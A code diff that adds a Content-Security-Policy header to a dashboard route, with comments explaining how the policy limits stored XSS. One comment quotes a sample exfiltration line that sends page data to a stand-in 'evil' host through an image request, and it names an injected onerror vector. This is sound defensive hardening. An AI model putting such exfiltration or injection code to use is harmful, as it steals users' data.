@@ -22,6 +22,13 @@
  *              manual step documented in the README.
  *
  * Change log:
+ *   1.3.0 (2026-08-04) — /dashboard now sends a Content-Security-Policy. With
+ *                        'unsafe-inline' (mandatory — the page has inline
+ *                        handlers) an injected script still runs; what the
+ *                        policy removes is its exit, so a stored XSS becomes
+ *                        local vandalism instead of silent theft of the board.
+ *                        Verified in Chromium under this exact policy: page
+ *                        renders, /api/* fetches succeed, zero violations.
  *   1.2.0 (2026-08-04) — /digest/preview owns a `dashboard` UsageRecorder and
  *                        flushes it in a finally. This route sits outside the
  *                        /api/* middleware, so it cannot inherit the
@@ -101,6 +108,27 @@ app.get("/dashboard", async (c) => {
 	if (denied) return denied;
 	return c.html(DASHBOARD_HTML, 200, {
 		"Cache-Control": "no-store",
+		// Honest about what this buys: 'unsafe-inline' is mandatory (the page has
+		// one inline <script> and a dozen inline onclick/onchange handlers, and
+		// nonces don't cover handler attributes), so an injected <img onerror>
+		// still RUNS. What the policy removes is the payload's exit —
+		// connect-src 'self' blocks fetch/XHR/beacon to an attacker origin,
+		// img-src 'self' data: blocks the classic new Image().src='//evil/'+data
+		// exfil, and default-src 'none' blocks pulling a remote script. It
+		// downgrades a stored XSS from silent theft of the board and the /api/*
+		// surface to local vandalism. The actual fix is escaping (see esc() in
+		// page.html); this is the second layer.
+		//
+		// Every directive is measured against the page, not guessed: it loads
+		// zero external resources — the only sub-resources are same-origin
+		// /manifest.webmanifest and /icon.svg. Card links are top-level
+		// navigations to trello.com, which CSP fetch directives don't govern, so
+		// they keep working. X-Frame-Options stays because old Safari honours
+		// only that, not frame-ancestors. v1.21.3
+		"Content-Security-Policy":
+			"default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; " +
+			"img-src 'self' data:; connect-src 'self'; manifest-src 'self'; " +
+			"base-uri 'none'; form-action 'none'; frame-ancestors 'none'",
 		"X-Frame-Options": "DENY",
 	});
 });
